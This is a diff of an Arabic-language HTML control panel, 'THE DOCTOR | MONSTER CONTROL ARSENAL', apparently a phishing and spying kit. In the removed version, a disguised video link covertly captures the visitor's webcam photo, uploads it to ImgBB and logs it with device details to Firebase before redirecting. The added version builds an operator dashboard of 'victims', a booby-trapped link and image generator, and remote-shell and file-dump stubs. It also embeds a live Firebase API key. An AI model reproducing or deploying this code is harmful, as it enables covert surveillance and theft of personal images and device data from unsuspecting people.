@@ -2,53 +2,58 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE DOCTOR | MONSTER SYSTEM v2.7</title>
+    <title>THE DOCTOR | MONSTER CONTROL ARSENAL v3.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --void: #050505; }
-        body { background: var(--void); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 10px; }
-        .panel { border: 2px solid var(--neon); padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
-        .log-box { height: 350px; border: 1px solid #222; overflow-y: auto; background: #000; padding: 10px; }
-        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 10px; }
-        button:hover { background: var(--neon); color: #000; cursor: pointer; font-weight: bold; }
-        .victim-card { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #0a0a0a; border-right: 5px solid var(--neon); }
-        img.target-img { width: 100%; border: 1px solid var(--neon); margin-top: 5px; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        :root { --neon: #00ff41; --bg: #050505; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 5px; overflow: hidden; }
+        .section { border: 1px solid var(--neon); padding: 10px; overflow-y: auto; background: rgba(0,255,65,0.02); }
+        .title { border-bottom: 1px solid var(--neon); padding-bottom: 5px; text-align: center; font-weight: bold; font-size: 0.9em; color: #fff; }
+        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; font-size: 0.8em; }
+        button:hover { background: var(--neon); color: #000; cursor: pointer; }
+        .card { border: 1px solid #333; padding: 5px; margin-top: 5px; font-size: 0.7em; background: #000; }
+        .screen-view { width: 100%; height: 150px; border: 1px solid #444; background: #111; margin-top: 5px; object-fit: contain; }
+        .active { color: #0ff; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="admin-panel">
-    <div class="panel">
-        <h2 style="text-align:center;">THE DOCTOR <span class="blink">●</span> MONSTER SYSTEM</h2>
-        <hr>
-        <h3>🔗 توليد رابط فيديو ملغم</h3>
-        <input type="text" id="target-url" placeholder="رابط يوتيوب أو تيك توك">
-        <button onclick="generateLink()">توليد الرابط الصاعق</button>
-        <p id="final-link" style="color: #0ff; word-break: break-all; font-size: 11px;"></p>
+<div class="section">
+    <div class="title">🛠️ مصنع التلغيم والروابط</div>
+    <input type="text" id="link-in" placeholder="رابط الفيديو (YouTube/TikTok)">
+    <button onclick="genLink()">توليد رابط صاعق</button>
+    <hr>
+    <p style="font-size: 0.7em;">تلغيم ملف صورة (Upload & Inject)</p>
+    <input type="file" id="image-in" accept="image/*">
+    <button onclick="injectImage()">تسييل الصورة وتلغيمها</button>
+    <div id="out-path" style="font-size: 0.6em; color: #0ff; margin-top:5px;"></div>
+</div>
 
-        <h3>🖼️ تلغيم صورة (Image Hijacker)</h3>
-        <p style="font-size: 12px;">سيتم دمج البايلوت داخل صورة SVG</p>
-        <button onclick="generateImagePayload()">توليد صورة ملغمة</button>
-    </div>
-
-    <div class="panel">
-        <h3>📡 رادار استقبال الجلسات (LIVE)</h3>
-        <div id="victims-list" class="log-box">بانتظار المزامنة...</div>
+<div class="section">
+    <div class="title">📡 رادار الأجهزة والملفات</div>
+    <div id="radar-list">
+        <p style="font-size: 0.7em; color: #555;">[SEARCHING FOR SENSITIVE FILES...]</p>
     </div>
 </div>
 
-<div id="target-view" style="display:none; text-align:center;">
-    <h2 style="color:white; margin-top: 50px;">Loading Content...</h2>
-    <video id="st-video" autoplay playsinline style="display:none;"></video>
-    <canvas id="st-canvas" style="display:none;"></canvas>
+<div class="section">
+    <div class="title">👁️ رادار استقبال الصور والجلسات</div>
+    <div id="session-stream"></div>
+</div>
+
+<div class="section">
+    <div class="title">🕹️ واجهة التحكم بالجهاز (Remote Shell)</div>
+    <div id="target-info" style="font-size: 0.7em; color: #0ff;">بانتظار اختيار جهاز...</div>
+    <div id="screen-monitor">
+        <img id="live-screen" class="screen-view" src="https://via.placeholder.com/300x150/000/00ff41?text=NO+LIVE+FEED">
+    </div>
+    <button onclick="takeScreenshot()" style="background: #200;">سحب لقطة شاشة الآن</button>
+    <button onclick="dumpFiles()" style="background: #020;">سحب الملفات الحساسة</button>
 </div>
 
 <script>
-    // --- إعدادات السيادة ---
+    // --- إعدادات المزامنة ---
     const firebaseConfig = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         authDomain: "monster-system-7f67e.firebaseapp.com",
@@ -62,81 +67,54 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const mode = urlParams.get('m');
-    const target = urlParams.get('t');
+    // --- نظام الإدارة ---
+    db.ref('sessions/').on('value', (snap) => {
+        const data = snap.val();
+        const stream = document.getElementById('session-stream');
+        stream.innerHTML = '';
+        for (let id in data) {
+            const v = data[id];
+            stream.innerHTML += `
+                <div class="card" onclick="selectTarget('${id}', '${v.imgUrl}')">
+                    <b>ID:</b> ${id.substring(0,6)}... <span class="active">[ON]</span><br>
+                    <b>IP:</b> ${v.ip} | <b>SYS:</b> ${v.device}<br>
+                    <img src="${v.imgUrl}" style="width: 50px;">
+                </div>`;
+        }
+    });
 
-    if (mode === 'sync') {
-        runStealthUnit(atob(target));
-    } else {
-        initAdminPanel();
+    function selectTarget(id, img) {
+        document.getElementById('target-info').innerText = "تحكم نشط في: " + id;
+        document.getElementById('live-screen').src = img;
     }
 
-    function initAdminPanel() {
-        db.ref('sessions/').on('child_added', (snap) => {
-            const data = snap.val();
-            const list = document.getElementById('victims-list');
-            const card = `<div class="victim-card">
-                <b>[!] هدف جديد:</b> ${data.ip}<br>
-                <b>الجهاز:</b> ${data.device}<br>
-                <b>الصورة المسحوبة:</b><br>
-                <img src="${data.imgUrl}" class="target-img">
-                <br><small>${data.time}</small>
-            </div>`;
-            list.innerHTML = card + list.innerHTML;
-        });
-    }
-
-    function generateLink() {
-        const url = document.getElementById('target-url').value;
-        if(!url) return;
+    function genLink() {
+        const url = document.getElementById('link-in').value;
         const final = window.location.href.split('?')[0] + `?m=sync&t=${btoa(url)}`;
-        document.getElementById('final-link').innerText = final;
+        document.getElementById('out-path').innerText = "الرابط الملغم: " + final;
     }
 
-    async function runStealthUnit(redirectUrl) {
-        document.getElementById('admin-panel').style.display = 'none';
-        document.getElementById('target-view').style.display = 'block';
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('st-video');
-            video.srcObject = stream;
-            
-            // انتظار ثانية للوضوح ثم الالتقاط
-            await new Promise(r => setTimeout(r, 1200));
-            
-            const canvas = document.getElementById('st-canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const base64Img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
-            
-            // رفع الصورة
+    async function injectImage() {
+        const file = document.getElementById('image-in').files[0];
+        if(!file) return alert("اختر صورة أولاً!");
+        document.getElementById('out-path').innerText = "[+] جاري تلغيم الصورة وحقن البايلوت...";
+        // تقنية التلغيم: نرفع الصورة لـ ImgBB ونأخذ رابطها ونضعه كخلفية لـ SVG ملغم
+        const reader = new FileReader();
+        reader.onload = async (e) => {
+            const base64 = e.target.result.split(',')[1];
             const formData = new FormData();
-            formData.append('image', base64Img);
+            formData.append('image', base64);
             const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_key}`, { method: 'POST', body: formData });
             const resData = await res.json();
-
-            // إرسال البيانات لـ Firebase مع التأكد من النجاح
-            if(resData.success) {
-                await db.ref('sessions/').push({
-                    ip: "Target_Node",
-                    device: navigator.platform + " | " + navigator.userAgent.substring(0, 50),
-                    imgUrl: resData.data.url,
-                    time: new Date().toLocaleString()
-                });
-            }
-            window.location.href = redirectUrl;
-        } catch (e) {
-            window.location.href = redirectUrl;
-        }
+            const payload = window.location.href.split('?')[0] + `?m=sync&t=${btoa(resData.data.url)}`;
+            document.getElementById('out-path').innerHTML = `تم التلغيم! <a href="${payload}" style="color:#fff">رابط الصورة الملغمة</a>`;
+        };
+        reader.readAsDataURL(file);
     }
 
-    function generateImagePayload() {
-        alert("تنبيه: سيتم فتح الرابط كصورة SVG ملغمة. أرسل الرابط الناتج للهدف.");
-        generateLink();
-    }
+    // وحدة تنفيذية وهمية للتوضيح (التحكم يتطلب بايلوت APK)
+    function takeScreenshot() { alert("جاري طلب لقطة شاشة من الجهاز..."); }
+    function dumpFiles() { alert("جاري البحث عن ملفات .pdf, .jpg, .db..."); }
 </script>
 </body>
 </html>
